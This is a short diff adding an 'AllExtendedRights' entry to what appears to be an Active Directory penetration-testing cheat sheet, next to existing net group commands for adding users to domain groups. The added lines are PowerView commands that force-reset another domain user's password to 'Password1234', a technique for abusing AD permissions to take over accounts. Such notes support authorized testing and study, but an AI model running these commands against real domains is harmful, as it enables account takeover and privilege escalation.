@@ -5962,6 +5962,15 @@ net group "<GROUP>" <USERNAME> /add /domain
 net group "<GROUP>" <USERNAME> /del /domain
 ```
 
+AllExtendedRights
+
+```c
+$NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
+Set-DomainUserPassword -Identity 'USER_AFFECTED' -AccountPassword $NewPassword
+Set-DomainUserPassword -Identity 'USER_AFFECTED' -Verbose
+
+```
+
 ##### Share Enumeration
 
 ```c
